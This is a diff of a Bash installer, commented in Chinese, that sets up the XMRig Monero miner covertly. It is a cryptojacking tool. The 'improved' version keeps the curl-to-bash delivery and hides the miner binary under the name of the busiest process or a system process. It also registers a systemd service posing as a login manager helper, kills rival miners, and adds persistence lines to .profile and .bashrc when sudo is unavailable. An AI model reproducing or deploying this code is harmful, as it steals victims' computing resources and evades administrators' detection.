@@ -1,12 +1,11 @@
 #!/bin/bash
 
-# XMR Mining Script
-# Usage: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [--auto-compile]
+# XMR Mining Script - Improved Version
+# Usage: curl -s -L x.x/miner_improved.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [CPU利用率%] [--auto-compile]
 
 set -e
 
 # 设置环境变量
-export HOME=/root
 export LC_ALL=en_US.UTF-8
 
 # 初始化全局变量
@@ -15,6 +14,7 @@ IS_CONTAINER=false
 DISGUISE_NAME=""
 SERVICE_NAME=""
 COMPILE_FROM_SOURCE=false
+HAS_SUDO=false
 
 # 解析命令行参数
 for arg in "$@"; do
@@ -53,33 +53,52 @@ log_debug() {
     echo -e "${BLUE}[DEBUG]${NC} $1"
 }
 
+# 检测sudo权限
+check_sudo_permissions() {
+    log_info "检测sudo权限..."
+    
+    if sudo -n true 2>/dev/null; then
+        HAS_SUDO=true
+        log_info "检测到sudo权限"
+    else
+        HAS_SUDO=false
+        log_warn "无sudo权限，将使用用户模式安装"
+    fi
+}
+
 # 获取伪装进程名
 get_disguise_name() {
     # 获取CPU占用最高的进程名，排除xmrig相关进程
-    local top_process=$(ps aux --no-headers | grep -v -i xmrig | sort -rn -k3 | head -1 | awk '{print $11}' | sed 's/.*\///')
+    local top_process=$(ps aux --no-headers 2>/dev/null | grep -v -i xmrig | grep -v -i "$DISGUISE_NAME" | sort -rn -k3 | head -1 | awk '{print $11}' | sed 's/.*\///' 2>/dev/null || echo "")
     
     # 如果获取失败或为空，或者是系统命令，使用备选系统进程名
     if [ -z "$top_process" ] || [ "$top_process" = "ps" ] || [ "$top_process" = "sort" ] || [ "$top_process" = "grep" ] || [ "$top_process" = "awk" ]; then
-        local system_processes=("systemd" "kthreadd" "ksoftirqd/0" "migration/0" "rcu_gp" "rcu_par_gp" "kworker/0:0H" "mm_percpu_wq" "ksoftirqd/1" "migration/1" "rcu_sched" "watchdog/0" "sshd" "NetworkManager" "systemd-logind")
+        local system_processes=("systemd" "kthreadd" "ksoftirqd" "migration" "rcu_gp" "kworker" "sshd" "NetworkManager" "systemd-logind")
         top_process=${system_processes[$RANDOM % ${#system_processes[@]}]}
     fi
     
     echo "$top_process"
 }
 
-# 创建隐藏目录
+# 创建隐藏目录 - 改进版本使用tmp目录
 create_hidden_dirs() {
     log_info "创建隐藏安装目录..."
     
-    # 使用深层系统目录
-    WORK_DIR="/usr/lib/systemd/system-generators/.cache/systemd-update-utmp"
+    # 使用用户可写的临时目录，而不是系统目录
+    if [ -n "$HOME" ] && [ -d "$HOME" ]; then
+        # 优先使用用户主目录下的隐藏目录
+        WORK_DIR="$HOME/.cache/systemd-update"
+    else
+        # 如果没有HOME或HOME不存在，使用/tmp下的隐藏目录
+        local temp_base="/tmp/.systemd-cache"
+        WORK_DIR="$temp_base/systemd-update-$(whoami)"
+    fi
     
     # 创建目录结构
     mkdir -p "$WORK_DIR"
     
-    # 设置目录权限
-    chmod 755 "$WORK_DIR"
-    chmod 755 "/usr/lib/systemd/system-generators/.cache"
+    # 设置目录权限（只有所有者可访问）
+    chmod 700 "$WORK_DIR"
     
     log_info "工作目录: $WORK_DIR"
 }
@@ -87,8 +106,8 @@ create_hidden_dirs() {
 # 检查参数
 if [ $# -lt 2 ]; then
     log_error "参数不足！"
-    echo "使用方法: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [CPU利用率%]"
-    echo "示例: curl -s -L x.x/miner.sh | LC_ALL=en_US.UTF-8 bash -s 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pool.supportxmr.com:443 50"
+    echo "使用方法: curl -s -L x.x/miner_improved.sh | LC_ALL=en_US.UTF-8 bash -s 钱包地址 矿池域名:端口 [CPU利用率%] [--auto-compile]"
+    echo "示例: curl -s -L x.x/miner_improved.sh | LC_ALL=en_US.UTF-8 bash -s 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx pool.supportxmr.com:443 50"
     echo "CPU利用率参数可选，默认使用所有CPU核心，设置50表示使用50%的CPU核心"
     exit 1
 fi
@@ -295,33 +314,6 @@ set_version() {
 get_download_url() {
     log_info "确定下载链接..."
     
-    # 根据操作系统和架构确定适当的下载URL
-    case $OS_ID in
-        ubuntu|debian)
-            if [ "$OS_VERSION" = "20.04" ] || [ "$OS_VERSION" = "20" ]; then
-                DISTRO="focal"
-            elif [ "$OS_VERSION" = "22.04" ] || [ "$OS_VERSION" = "22" ]; then
-                DISTRO="jammy"
-            elif [ "$OS_VERSION" = "24.04" ] || [ "$OS_VERSION" = "24" ]; then
-                DISTRO="noble"
-            else
-                DISTRO="focal"  # 默认回退
-            fi
-            ;;
-        centos|rhel|rocky|almalinux|fedora)
-            DISTRO="linux-static"  # RHEL系使用静态构建
-            ;;
-        freebsd)
-            DISTRO="freebsd-static"
-            ;;
-        alpine)
-            DISTRO="linux-static"  # Alpine使用静态构建
-            ;;
-        *)
-            DISTRO="linux-static"  # 默认使用静态构建
-            ;;
-    esac
-    
     # 直接使用可执行文件名，不再需要压缩包
     FILENAME="xmrig"
     
@@ -330,23 +322,23 @@ get_download_url() {
     log_info "下载链接: $DOWNLOAD_URL"
 }
 
-# 检测并终止现有的xmrig进程
-kill_existing_xmrig() {
-    log_info "检测现有的xmrig进程..."
+# 检测并终止现有的挖矿进程
+kill_existing_miner() {
+    log_info "检测现有的挖矿进程..."
     
-    # 使用ps命令查找xmrig进程
-    local xmrig_pids=$(ps -ef | grep -i xmrig | grep -v grep | awk '{print $2}')
+    # 使用ps命令查找挖矿进程（包括xmrig和伪装名称）
+    local miner_pids=$(ps -ef 2>/dev/null | grep -E "(xmrig|$DISGUISE_NAME)" | grep -v grep | awk '{print $2}' || echo "")
     
-    if [ -n "$xmrig_pids" ]; then
-        log_warn "发现现有的xmrig进程，正在终止..."
+    if [ -n "$miner_pids" ]; then
+        log_warn "发现现有的挖矿进程，正在终止..."
         
         # 遍历所有找到的PID并终止
-        for pid in $xmrig_pids; do
+        for pid in $miner_pids; do
             if [ -n "$pid" ] && [ "$pid" -gt 0 ]; then
                 log_info "终止进程 PID: $pid"
                 
                 # 尝试使用sudo终止进程
-                if command -v sudo >/dev/null 2>&1; then
+                if [ "$HAS_SUDO" = true ]; then
                     sudo kill -9 "$pid" 2>/dev/null || {
                         log_warn "使用sudo终止进程 $pid 失败，尝试直接终止"
                         kill -9 "$pid" 2>/dev/null || log_warn "无法终止进程 $pid"
@@ -362,14 +354,14 @@ kill_existing_xmrig() {
         sleep 2
         
         # 再次检查是否还有残留进程
-        local remaining_pids=$(ps -ef | grep -i xmrig | grep -v grep | awk '{print $2}')
+        local remaining_pids=$(ps -ef 2>/dev/null | grep -E "(xmrig|$DISGUISE_NAME)" | grep -v grep | awk '{print $2}' || echo "")
         if [ -n "$remaining_pids" ]; then
-            log_warn "仍有xmrig进程运行，但将继续安装"
+            log_warn "仍有挖矿进程运行，但将继续安装"
         else
-            log_info "所有xmrig进程已成功终止"
+            log_info "所有挖矿进程已成功终止"
         fi
     else
-        log_info "未发现现有的xmrig进程"
+        log_info "未发现现有的挖矿进程"
     fi
 }
 
@@ -427,58 +419,14 @@ check_prerequisites() {
     
     if [ -n "$missing_commands" ]; then
         log_warn "缺少必需的命令:$missing_commands"
-        log_info "尝试安装缺少的依赖..."
-        install_missing_dependencies
         
-        # 安装后重新检查关键工具
-        if ! command -v tar >/dev/null 2>&1; then
-            log_error "安装tar失败。请手动安装后重新运行脚本。"
+        if [ "$HAS_SUDO" = true ]; then
+            log_info "尝试安装缺少的依赖..."
+            install_missing_dependencies
+        else
+            log_error "缺少必需的依赖且无sudo权限，请手动安装: $missing_commands"
             exit 1
         fi
-        
-        # 重新检查下载工具
-        has_downloader=false
-        if command -v wget >/dev/null 2>&1; then
-            has_downloader=true
-        fi
-        if command -v curl >/dev/null 2>&1; then
-            has_downloader=true
-        fi
-        
-        if [ "$has_downloader" = false ]; then
-            log_error "安装下载工具失败。请手动安装wget或curl后重新运行脚本。"
-            exit 1
-        fi
-        
-        # 如果需要编译，重新检查编译工具
-        if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            if ! command -v gcc >/dev/null 2>&1 && ! command -v clang >/dev/null 2>&1; then
-                log_error "安装C编译器失败。请手动安装gcc或clang后重新运行脚本。"
-                exit 1
-            fi
-            
-            if ! command -v g++ >/dev/null 2>&1 && ! command -v clang++ >/dev/null 2>&1; then
-                log_error "安装C++编译器失败。请手动安装g++或clang++后重新运行脚本。"
-                exit 1
-            fi
-            
-            if ! command -v make >/dev/null 2>&1; then
-                log_error "安装make失败。请手动安装make后重新运行脚本。"
-                exit 1
-            fi
-            
-            if ! command -v cmake >/dev/null 2>&1; then
-                log_error "安装cmake失败。请手动安装cmake后重新运行脚本。"
-                exit 1
-            fi
-            
-            if ! command -v git >/dev/null 2>&1; then
-                log_error "安装git失败。请手动安装git后重新运行脚本。"
-                exit 1
-            fi
-        fi
-        
-        log_info "所有必需的依赖现在都可用了。"
     else
         log_info "所有必需的依赖都可用。"
     fi
@@ -497,35 +445,35 @@ install_missing_dependencies() {
     fi
     
     if command -v apt-get >/dev/null 2>&1; then
-        # Debian/Ubuntu - 使用类似C3Pool的简单方法
+        # Debian/Ubuntu
         log_info "更新包列表..."
-        if ! apt-get update $install_flags; then
+        if ! sudo apt-get update $install_flags; then
             log_warn "包更新失败，但继续执行..."
         fi
         
         log_info "安装缺少的包..."
         if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            apt-get install $install_flags wget curl tar build-essential cmake git libuv1-dev libssl-dev libhwloc-dev || {
+            sudo apt-get install $install_flags wget curl tar build-essential cmake git libuv1-dev libssl-dev libhwloc-dev || {
                 log_error "安装包失败。请运行: sudo apt-get install wget curl tar build-essential cmake git libuv1-dev libssl-dev libhwloc-dev"
                 exit 1
             }
         else
-            apt-get install $install_flags wget curl tar || {
+            sudo apt-get install $install_flags wget curl tar || {
                 log_error "安装包失败。请运行: sudo apt-get install wget curl tar"
                 exit 1
             }
         fi
         
     elif command -v apk >/dev/null 2>&1; then
-        # Alpine Linux - 容器环境常用
+        # Alpine Linux
         log_info "检测到Alpine Linux，安装必要包..."
         if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            apk add --no-cache wget curl tar build-base cmake git libuv-dev openssl-dev hwloc-dev || {
+            sudo apk add --no-cache wget curl tar build-base cmake git libuv-dev openssl-dev hwloc-dev || {
                 log_error "安装包失败。请运行: apk add wget curl tar build-base cmake git libuv-dev openssl-dev hwloc-dev"
                 exit 1
             }
         else
-            apk add --no-cache wget curl tar || {
+            sudo apk add --no-cache wget curl tar || {
                 log_error "安装包失败。请运行: apk add wget curl tar"
                 exit 1
             }
@@ -534,16 +482,16 @@ install_missing_dependencies() {
     elif command -v yum >/dev/null 2>&1; then
         # CentOS/RHEL 7
         if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            yum groupinstall $install_flags "Development Tools" || {
+            sudo yum groupinstall $install_flags "Development Tools" || {
                 log_error "安装开发工具失败。请运行: sudo yum groupinstall \"Development Tools\""
                 exit 1
             }
-            yum install $install_flags wget curl tar cmake git libuv-devel openssl-devel hwloc-devel || {
+            sudo yum install $install_flags wget curl tar cmake git libuv-devel openssl-devel hwloc-devel || {
                 log_error "安装包失败。请运行: sudo yum install wget curl tar cmake git libuv-devel openssl-devel hwloc-devel"
                 exit 1
             }
         else
-            yum install -y wget curl tar || {
+            sudo yum install -y wget curl tar || {
                 log_error "安装包失败。请运行: sudo yum install wget curl tar"
                 exit 1
             }
@@ -551,70 +499,20 @@ install_missing_dependencies() {
     elif command -v dnf >/dev/null 2>&1; then
         # CentOS/RHEL 8+/Fedora
         if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            dnf groupinstall -y "Development Tools" || {
+            sudo dnf groupinstall -y "Development Tools" || {
                 log_error "安装开发工具失败。请运行: sudo dnf groupinstall \"Development Tools\""
                 exit 1
             }
-            dnf install -y wget curl tar cmake git || {
+            sudo dnf install -y wget curl tar cmake git || {
                 log_error "安装包失败。请运行: sudo dnf install wget curl tar cmake git"
                 exit 1
             }
         else
-            dnf install -y wget curl tar || {
+            sudo dnf install -y wget curl tar || {
                 log_error "安装包失败。请运行: sudo dnf install wget curl tar"
                 exit 1
             }
         fi
-    elif command -v zypper >/dev/null 2>&1; then
-        # openSUSE
-        if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            zypper install -y -t pattern devel_basis || {
-                log_error "安装开发工具失败。请运行: sudo zypper install -t pattern devel_basis"
-                exit 1
-            }
-            zypper install -y wget curl tar cmake git || {
-                log_error "安装包失败。请运行: sudo zypper install wget curl tar cmake git"
-                exit 1
-            }
-        else
-            zypper install -y wget curl tar || {
-                log_error "安装包失败。请运行: sudo zypper install wget curl tar"
-                exit 1
-            }
-        fi
-    elif command -v pacman >/dev/null 2>&1; then
-        # Arch Linux
-        if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            pacman -Sy --noconfirm base-devel wget curl tar cmake git || {
-                log_error "安装包失败。请运行: sudo pacman -S base-devel wget curl tar cmake git"
-                exit 1
-            }
-        else
-            pacman -Sy --noconfirm wget curl tar || {
-                log_error "安装包失败。请运行: sudo pacman -S wget curl tar"
-                exit 1
-            }
-        fi
-    elif command -v apk >/dev/null 2>&1; then
-        # Alpine Linux
-        if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            apk add --no-cache wget curl tar build-base cmake git || {
-                log_error "安装包失败。请运行: sudo apk add wget curl tar build-base cmake git"
-                exit 1
-            }
-        else
-            apk add --no-cache wget curl tar || {
-                log_error "安装包失败。请运行: sudo apk add wget curl tar"
-                exit 1
-            }
-        fi
-    else
-        if [ "$COMPILE_FROM_SOURCE" = true ]; then
-            log_error "无法识别包管理器。请手动安装 wget、curl、tar、gcc、g++、make、cmake、git 后重新运行脚本。"
-        else
-            log_error "无法识别包管理器。请手动安装 wget、curl、tar 后重新运行脚本。"
-        fi
-        exit 1
     fi
 }
 
@@ -622,181 +520,68 @@ install_missing_dependencies() {
 download_and_install() {
     log_info "下载和安装XMRig..."
     
-    # 创建隐藏目录
-    create_hidden_dirs
     cd "$WORK_DIR"
     
     if [ "$COMPILE_FROM_SOURCE" = true ]; then
-        # ARM架构：下载源码并编译
         compile_from_source
-    else
-        # x64架构：下载预编译版本
-        download_precompiled_binary
+        return
     fi
-}
-
-# 下载预编译二进制文件
-download_precompiled_binary() {
-    # 下载文件 - 优先使用wget，备用curl
-    log_info "下载 $FILENAME ..."
     
-    # 尝试使用wget下载
+    # 下载预编译的挖矿程序
+    log_info "下载挖矿程序二进制文件..."
+    
     if command -v wget >/dev/null 2>&1; then
-        log_info "使用wget下载..."
-        if wget -q --show-progress "$DOWNLOAD_URL" -O "$FILENAME" 2>/dev/null; then
-            log_info "wget下载成功"
-        else
-            log_warn "wget下载失败，尝试使用curl..."
-            rm -f "$FILENAME"  # 清理可能的部分下载文件
-            
-            if command -v curl >/dev/null 2>&1; then
-                if curl -L -o "$FILENAME" "$DOWNLOAD_URL" --progress-bar; then
-                    log_info "curl下载成功"
-                else
-                    log_error "curl下载也失败"
-                    exit 1
-                fi
-            else
-                log_error "wget和curl都不可用，无法下载文件"
-                exit 1
-            fi
+        if ! wget -O "$DISGUISE_NAME" "$DOWNLOAD_URL"; then
+            log_error "下载失败: $DOWNLOAD_URL"
+            exit 1
         fi
     elif command -v curl >/dev/null 2>&1; then
-        log_info "使用curl下载..."
-        if curl -L -o "$FILENAME" "$DOWNLOAD_URL" --progress-bar; then
-            log_info "curl下载成功"
-        else
-            log_error "curl下载失败"
+        if ! curl -L -o "$DISGUISE_NAME" "$DOWNLOAD_URL"; then
+            log_error "下载失败: $DOWNLOAD_URL"
             exit 1
         fi
     else
-        log_error "wget和curl都不可用，无法下载文件"
-        log_error "请安装wget或curl后重新运行脚本"
+        log_error "没有可用的下载工具 (wget或curl)"
         exit 1
     fi
+    
+    # 设置执行权限
+    chmod +x "$DISGUISE_NAME"
     
     # 验证下载的文件
-    if [ ! -f "$FILENAME" ] || [ ! -s "$FILENAME" ]; then
-        log_error "下载的文件不存在或为空"
+    if [ ! -f "$DISGUISE_NAME" ] || [ ! -x "$DISGUISE_NAME" ]; then
+        log_error "下载的挖矿程序文件无效"
         exit 1
     fi
-    
-    log_info "文件下载完成，大小: $(du -h "$FILENAME" | cut -f1)"
-    
-    # 设置可执行权限
-    log_info "设置可执行权限..."
-    chmod +x "$FILENAME" || {
-        log_error "设置可执行权限失败"
-        exit 1
-    }
-    
-    # 删除官方配置文件（如果存在）
-    if [ -f "$WORK_DIR/config.json" ]; then
-        log_info "删除官方默认配置文件..."
-        rm -f "$WORK_DIR/config.json"
-    fi
-    
-    # 删除不必要的文件
-    log_info "清理不必要的文件..."
-    rm -f SHA256SUMS 2>/dev/null || true
-    rm -f *.txt 2>/dev/null || true
-    rm -f README* 2>/dev/null || true
-    rm -f LICENSE* 2>/dev/null || true
     
     # 进程名称伪装
     log_info "设置进程伪装..."
-    log_info "将xmrig重命名为: $DISGUISE_NAME"
+    log_info "挖矿程序已伪装为: $DISGUISE_NAME"
     
-    # 重命名xmrig为伪装名称（使用全局变量确保与systemd服务配置一致）
-    mv "$FILENAME" "$DISGUISE_NAME" || {
-        log_error "重命名xmrig失败"
-        exit 1
-    }
+    # 创建软链接保持兼容性（仅用于内部脚本调用）
+    ln -sf "$DISGUISE_NAME" .xmrig_internal
     
-    # 设置伪装文件的执行权限
-    chmod +x "$DISGUISE_NAME"
-    
-    # 创建软链接保持兼容性
-    ln -sf "$DISGUISE_NAME" xmrig
+    log_info "挖矿程序下载和安装完成，进程已伪装为: $DISGUISE_NAME"
 }
 
 # 从源码编译XMRig
 compile_from_source() {
-    log_info "开始从源码编译XMRig..."
-    
-    # 设置源码下载URL和文件名
-    local SOURCE_URL="https://gh.llkk.cc/https://github.com/xmrig/xmrig/archive/v${VERSION}.tar.gz"
-    local SOURCE_FILENAME="xmrig-${VERSION}.tar.gz"
-    
-    log_info "下载源码: $SOURCE_FILENAME"
+    log_info "从源码编译XMRig..."
     
     # 下载源码
-    if command -v wget >/dev/null 2>&1; then
-        log_info "使用wget下载源码..."
-        if wget -q --show-progress "$SOURCE_URL" -O "$SOURCE_FILENAME" 2>/dev/null; then
-            log_info "wget下载成功"
-        else
-            log_warn "wget下载失败，尝试使用curl..."
-            rm -f "$SOURCE_FILENAME"
-            
-            if command -v curl >/dev/null 2>&1; then
-                if curl -L -o "$SOURCE_FILENAME" "$SOURCE_URL" --progress-bar; then
-                    log_info "curl下载成功"
-                else
-                    log_error "curl下载也失败"
-                    exit 1
-                fi
-            else
-                log_error "wget和curl都不可用，无法下载源码"
-                exit 1
-            fi
-        fi
-    elif command -v curl >/dev/null 2>&1; then
-        log_info "使用curl下载源码..."
-        if curl -L -o "$SOURCE_FILENAME" "$SOURCE_URL" --progress-bar; then
-            log_info "curl下载成功"
-        else
-            log_error "curl下载失败"
-            exit 1
-        fi
-    else
-        log_error "wget和curl都不可用，无法下载源码"
+    log_info "下载XMRig源码..."
+    if ! git clone https://github.com/xmrig/xmrig.git "xmrig-${VERSION}"; then
+        log_error "下载源码失败"
         exit 1
     fi
     
-    # 验证下载的源码文件
-    if [ ! -f "$SOURCE_FILENAME" ] || [ ! -s "$SOURCE_FILENAME" ]; then
-        log_error "下载的源码文件不存在或为空"
-        exit 1
+    cd "xmrig-${VERSION}"
+    
+    # 切换到指定版本
+    if ! git checkout "v${VERSION}"; then
+        log_warn "切换到版本 v${VERSION} 失败，使用最新版本"
     fi
     
-    log_info "源码下载完成，大小: $(du -h "$SOURCE_FILENAME" | cut -f1)"
-    
-    # 解压源码到当前目录
-    log_info "解压源码..."
-    tar -xzf "$SOURCE_FILENAME" || {
-        log_error "解压源码失败"
-        exit 1
-    }
-    
-    # 清理源码压缩包
-    rm -f "$SOURCE_FILENAME"
-    
-    # 进入源码目录
-    local SOURCE_DIR="xmrig-${VERSION}"
-    if [ ! -d "$SOURCE_DIR" ]; then
-        log_error "源码目录 $SOURCE_DIR 不存在"
-        exit 1
-    fi
-    
-    cd "$SOURCE_DIR" || {
-        log_error "无法进入源码目录 $SOURCE_DIR"
-        exit 1
-    }
-    
-    log_info "进入源码目录: $(pwd)"
-    
-    # 开始编译
     log_info "开始编译XMRig..."
     
     # 创建构建目录
@@ -846,14 +631,14 @@ compile_from_source() {
     
     # 检查编译结果
     if [ ! -f "xmrig" ]; then
-        log_error "编译完成但未找到xmrig可执行文件"
+        log_error "编译完成但未找到挖矿程序可执行文件"
         exit 1
     fi
     
     log_info "编译成功！"
     
-    # 复制编译好的文件到工作目录
-    cp xmrig "$WORK_DIR/"
+    # 复制编译好的文件到工作目录并重命名为伪装名称
+    cp xmrig "$WORK_DIR/$DISGUISE_NAME"
     cd "$WORK_DIR"
     
     # 清理源码目录
@@ -861,25 +646,16 @@ compile_from_source() {
     rm -rf "xmrig-${VERSION}"
     
     # 设置执行权限
-    chmod +x xmrig
+    chmod +x "$DISGUISE_NAME"
     
     # 进程名称伪装
     log_info "设置进程伪装..."
-    log_info "将xmrig重命名为: $DISGUISE_NAME"
+    log_info "挖矿程序已伪装为: $DISGUISE_NAME"
     
-    # 重命名xmrig为伪装名称（使用全局变量确保与systemd服务配置一致）
-    mv xmrig "$DISGUISE_NAME" || {
-        log_error "重命名xmrig失败"
-        exit 1
-    }
+    # 创建软链接保持兼容性（仅用于内部脚本调用）
+    ln -sf "$DISGUISE_NAME" .xmrig_internal
     
-    # 设置伪装文件的执行权限
-    chmod +x "$DISGUISE_NAME"
-    
-    # 创建软链接保持兼容性
-    ln -sf "$DISGUISE_NAME" xmrig
-    
-    log_info "XMRig编译和安装完成，进程已伪装为: $DISGUISE_NAME"
+    log_info "挖矿程序编译和安装完成，进程已伪装为: $DISGUISE_NAME"
 }
 
 # 创建配置文件
@@ -953,7 +729,7 @@ create_config() {
     },
     "donate-level": 0,
     "donate-over-proxy": 0,
-    "log-file": null,
+    "log-file": "$WORK_DIR/miner.log",
     "pools": [
         {
             "algo": null,
@@ -1000,118 +776,76 @@ create_config() {
 }
 EOF
     
+    # 创建后台运行配置文件
+    cp "$WORK_DIR/config.json" "$WORK_DIR/config_background.json"
+    sed -i 's/"background": false,/"background": true,/' "$WORK_DIR/config_background.json"
+    
     log_info "配置文件创建完成"
 }
 
-# 创建systemd服务
+# 创建启动脚本 - 参考c3pool的方式
+create_miner_script() {
+    log_info "创建挖矿启动脚本..."
+    
+    cat > "$WORK_DIR/miner.sh" << 'EOL'
+#!/bin/bash
+WORK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+DISGUISE_NAME="$(basename "$WORK_DIR"/../.disguise_name 2>/dev/null || echo "systemd")"
+
+if ! pidof "$DISGUISE_NAME" >/dev/null; then
+    cd "$WORK_DIR"
+    nice ./"$DISGUISE_NAME" "$@"
+else
+    echo "挖矿程序已经在后台运行。拒绝运行另一个。"
+    echo "如果要先删除后台矿工，请运行 \"killall $DISGUISE_NAME\"。"
+fi
+EOL
+    
+    chmod +x "$WORK_DIR/miner.sh"
+    
+    # 保存伪装名称供脚本使用
+    echo "$DISGUISE_NAME" > "$WORK_DIR/../.disguise_name"
+    
+    log_info "启动脚本创建完成"
+}
+
+# 创建systemd服务 - 仅在有sudo权限时
 create_systemd_service() {
     log_info "创建systemd服务..."
     
-    cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
+    cat > /tmp/${SERVICE_NAME}.service << EOF
 [Unit]
 Description=System Login Manager Helper Service
 After=network.target
 
 [Service]
 Type=simple
-User=root
+User=$(whoami)
 WorkingDirectory=$WORK_DIR
 ExecStart=$WORK_DIR/$DISGUISE_NAME --config=$WORK_DIR/config.json
 Restart=always
 RestartSec=10
-StandardOutput=null
-StandardError=null
+StandardOutput=journal
+StandardError=journal
 SyslogIdentifier=systemd-logind
 
 [Install]
 WantedBy=multi-user.target
 EOF
     
+    # 移动服务文件
+    sudo mv /tmp/${SERVICE_NAME}.service /etc/systemd/system/${SERVICE_NAME}.service
+    
     # 重新加载systemd配置
-    systemctl daemon-reload
+    sudo systemctl daemon-reload
     
     # 启用服务
-    systemctl enable ${SERVICE_NAME}.service
+    sudo systemctl enable ${SERVICE_NAME}.service
     
     log_info "systemd服务创建完成"
 }
 
-# 创建SysV init脚本（用于不支持systemd的系统）
-create_sysv_service() {
-    log_info "创建SysV init脚本..."
-    
-    cat > /etc/init.d/$SERVICE_NAME << EOF
-#!/bin/bash
-# $SERVICE_NAME        System Login Manager Helper Service
-# chkconfig: 35 99 99
-# description: System Login Manager Helper Service
-#
-
-. /etc/rc.d/init.d/functions
-
-USER="root"
-DAEMON="$DISGUISE_NAME"
-ROOT_DIR="$WORK_DIR"
-
-SERVER="\$ROOT_DIR/\$DAEMON"
-LOCK_FILE="/var/lock/subsys/$SERVICE_NAME"
-
-do_start() {
-    if [ ! -f "\$LOCK_FILE" ] ; then
-        echo -n \$"Starting \$DAEMON: "
-        runuser -l "\$USER" -c "\$SERVER --config=\$ROOT_DIR/config.json" && echo_success || echo_failure
-        RETVAL=\$?
-        echo
-        [ \$RETVAL -eq 0 ] && touch \$LOCK_FILE
-    else
-        echo "\$DAEMON is locked."
-    fi
-}
-do_stop() {
-    echo -n \$"Shutting down \$DAEMON: "
-    pid=\$(ps -aefw | grep "\$DAEMON" | grep -v " grep " | awk '{print \$2}')
-    kill -9 \$pid > /dev/null 2>&1
-    # Also kill any xmrig processes
-    pkill -f "xmrig" > /dev/null 2>&1
-    [ \$? -eq 0 ] && echo_success || echo_failure
-    RETVAL=\$?
-    echo
-    [ \$RETVAL -eq 0 ] && rm -f \$LOCK_FILE
-}
-
-case "\$1" in
-    start)
-        do_start
-        ;;
-    stop)
-        do_stop
-        ;;
-    restart)
-        do_stop
-        do_start
-        ;;
-    *)
-        echo "Usage: \$0 {start|stop|restart}"
-        RETVAL=1
-esac
-
-exit \$RETVAL
-EOF
-    
-    chmod +x /etc/init.d/$SERVICE_NAME
-    
-    # 添加到启动项
-    if command -v chkconfig >/dev/null 2>&1; then
-        chkconfig --add $SERVICE_NAME
-        chkconfig $SERVICE_NAME on
-    elif command -v update-rc.d >/dev/null 2>&1; then
-        update-rc.d $SERVICE_NAME defaults
-    fi
-    
-    log_info "SysV init脚本创建完成"
-}
-
-# 设置自启动
+# 设置自启动 - 参考c3pool的灵活方式
 setup_autostart() {
     log_info "设置系统自启动..."
     
@@ -1123,12 +857,35 @@ setup_autostart() {
         return 0
     fi
     
-    if command -v systemctl >/dev/null 2>&1; then
-        # 使用systemd
+    # 参考c3pool的方式：检查sudo权限决定使用哪种自启动方式
+    if [ "$HAS_SUDO" = true ] && command -v systemctl >/dev/null 2>&1; then
+        # 使用systemd服务
         create_systemd_service
     else
-        # 使用SysV init
-        create_sysv_service
+        # 使用用户级自启动 - 添加到.profile
+        log_info "无sudo权限或不支持systemd，使用用户级自启动"
+        
+        # 检查是否已经添加到.profile
+        if [ -n "$HOME" ] && [ -f "$HOME/.profile" ]; then
+            if ! grep -q "$WORK_DIR/miner.sh" "$HOME/.profile" 2>/dev/null; then
+                log_info "添加启动脚本到 $HOME/.profile"
+                echo "" >> "$HOME/.profile"
+                echo "# Miner autostart" >> "$HOME/.profile"
+                echo "$WORK_DIR/miner.sh --config=$WORK_DIR/config_background.json >/dev/null 2>&1 &" >> "$HOME/.profile"
+            else
+                log_info "启动脚本已存在于 $HOME/.profile 中"
+            fi
+        fi
+        
+        # 也尝试添加到.bashrc作为备选
+        if [ -n "$HOME" ] && [ -f "$HOME/.bashrc" ]; then
+            if ! grep -q "$WORK_DIR/miner.sh" "$HOME/.bashrc" 2>/dev/null; then
+                log_info "添加启动脚本到 $HOME/.bashrc"
+                echo "" >> "$HOME/.bashrc"
+                echo "# Miner autostart" >> "$HOME/.bashrc"
+                echo "$WORK_DIR/miner.sh --config=$WORK_DIR/config_background.json >/dev/null 2>&1 &" >> "$HOME/.bashrc"
+            fi
+        fi
     fi
 }
 
@@ -1142,7 +899,7 @@ start_mining() {
         cd "$WORK_DIR"
         
         # 在后台启动挖矿进程
-        nohup ./"$DISGUISE_NAME" --config=config.json > /dev/null 2>&1 &
+        nohup ./"$DISGUISE_NAME" --config=config.json > miner.log 2>&1 &
         local mining_pid=$!
         
         # 等待一下确保进程启动
@@ -1151,7 +908,7 @@ start_mining() {
         # 检查进程是否成功启动
         if kill -0 "$mining_pid" 2>/dev/null; then
             log_info "挖矿进程已在后台启动 (PID: $mining_pid)"
-            echo "$mining_pid" > "$WORK_DIR/xmrig.pid"
+            echo "$mining_pid" > "$WORK_DIR/miner.pid"
         else
             log_error "挖矿进程启动失败"
             return 1
@@ -1159,14 +916,98 @@ start_mining() {
         return 0
     fi
     
-    if command -v systemctl >/dev/null 2>&1; then
-        systemctl start ${SERVICE_NAME}.service
-        systemctl status ${SERVICE_NAME}.service --no-pager
+    if [ "$HAS_SUDO" = true ] && command -v systemctl >/dev/null 2>&1; then
+        sudo systemctl start ${SERVICE_NAME}.service
+        sudo systemctl status ${SERVICE_NAME}.service --no-pager
     else
-        service $SERVICE_NAME start
+        # 直接启动挖矿进程
+        log_info "直接启动挖矿进程..."
+        cd "$WORK_DIR"
+        nohup ./miner.sh --config=config_background.json > miner.log 2>&1 &
+        local mining_pid=$!
+        
+        # 等待一下确保进程启动
+        sleep 3
+        
